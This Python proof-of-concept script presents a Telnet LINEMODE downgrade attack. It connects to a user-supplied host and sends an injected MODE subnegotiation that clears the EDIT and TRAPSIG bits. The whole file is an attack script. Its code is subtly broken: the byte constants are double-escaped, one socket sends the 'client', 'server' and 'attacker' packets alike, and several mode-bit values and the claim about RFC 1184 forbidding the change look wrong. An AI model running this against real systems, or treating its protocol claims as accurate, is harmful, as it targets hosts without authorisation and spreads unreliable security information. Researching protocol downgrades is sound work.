#!/usr/bin/env python3
"""
Proof-of-Concept: Telnet LINEMODE Downgrade via Forced Mode Mask

This script demonstrates how an on-path attacker can manipulate the LINEMODE
negotiation phase to force a MODE command that disables EDIT and TRAPSIG bits.
According to RFC 1184, once these bits are set, they should not be cleared.
However, if the attacker injects a malicious MODE command during negotiation,
it may force the client into RAW_MODE without local editing or signal trapping.

Telnet Option Codes:
- LINEMODE (Option Code 38)
- MODE Subnegotiation: SB LINEMODE WILL/WONT/DO/DONT MODE ...
"""

import socket
import struct
import time
import sys

# Telnet Protocol Constants
IAC = b'\\xff'
WILL = b'\\xfb'
WONT = b'\\xfc'
DO = b'\\xfd'
DONT = b'\\xfe'
SB = b'\\xfa'  # Subnegotiation Begin
SE = b'\\xf0'  # Subnegotiation End
LINEMODE_OPTION = 38

# LINEMODE MODE Suboption Codes
MODE_EDIT = 1 << 0      # Bit 0: Edit Mode
MODE_TRAPSIG = 1 << 1   # Bit 1: Trap Signals
MODE_SOFT_TAB = 1 << 2  # Bit 2: Soft Tabs
MODE_LIT_ECHO = 1 << 3  # Bit 3: Literal Echo
MODE_FLOW = 1 << 4      # Bit 4: Flow Control

# Desired secure mode (EDIT and TRAPSIG set)
SECURE_MODE = MODE_EDIT | MODE_TRAPSIG

# Malicious mode (EDIT and TRAPSIG unset - Downgrade)
MALICIOUS_MODE = 0x00  # All bits cleared

def create_telnet_option(option, command):
    """Create a Telnet option negotiation packet."""
    return IAC + command + bytes([option])

def create_linemode_subnegotiation(mode_value):
    """Create a LINEMODE MODE subnegotiation packet."""
    # SB LINEMODE MODE <mode> SE
    sb_content = b'\\x01' + struct.pack('B', mode_value)
    return IAC + SB + bytes([LINEMODE_OPTION]) + sb_content + IAC + SE

def simulate_client_negotiation(target_ip, target_port):
    """
    Simulates a Telnet client initiating LINEMODE negotiation.
    In a real attack, this would be intercepted by the attacker.
    """
    print(f"[*] Connecting to {target_ip}:{target_port}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    
    # 1. Client sends LINEMODE WILL
    client_will = create_telnet_option(LINEMODE_OPTION, WILL)
    print(f"[*] Client sends: LINEMODE WILL")
    sock.send(client_will)
    
    # 2. Server responds with LINEMODE DO (Accepting LINEMODE)
    server_do = create_telnet_option(LINEMODE_OPTION, DO)
    print(f"[*] Server sends: LINEMODE DO")
    sock.send(server_do)
    
    # 3. Client sends LINEMODE MODE with SECURE settings
    client_mode_secure = create_linemode_subnegotiation(SECURE_MODE)
    print(f"[*] Client sends: LINEMODE MODE (Secure: EDIT=1, TRAPSIG=1)")
    sock.send(client_mode_secure)
    
    # 4. Attacker Injection Point
    # The attacker intercepts the response or injects a new packet before the client processes the server's ACK.
    # Here we simulate the attacker injecting a MALICIOUS MODE command.
    print("[*] ATTACKER: Injecting malicious LINEMODE MODE (Downgrade)")
    attacker_mode_malicious = create_linemode_subnegotiation(MALICIOUS_MODE)
    sock.send(attacker_mode_malicious)
    
    # 5. Server responds to the malicious mode
    # In a vulnerable implementation, the server might ACK the downgrade or the client accepts it.
    # We simulate the server sending an ACK for the malicious mode.
    server_ack_malicious = create_linemode_subnegotiation(MALICIOUS_MODE)
    print(f"[*] Server sends: LINEMODE MODE (ACK Malicious: EDIT=0, TRAPSIG=0)")
    sock.send(server_ack_malicious)
    
    # 6. Client receives the malicious ACK
    # If vulnerable, the client switches to RAW_MODE without local editing/trapping.
    print("[*] Client received MODE with EDIT=0, TRAPSIG=0")
    print("[!] VULNERABILITY: Connection downgraded to insecure mode!")
    
    return sock

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target_ip> <target_port>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    
    try:
        sock = simulate_client_negotiation(target_ip, target_port)
        print("[*] Connection established. Input will be sent in cleartext without local processing.")
        # Keep connection open for demonstration
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Interrupted by user.")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        if 'sock' in locals():
            sock.close()

if __name__ == "__main__":
    main()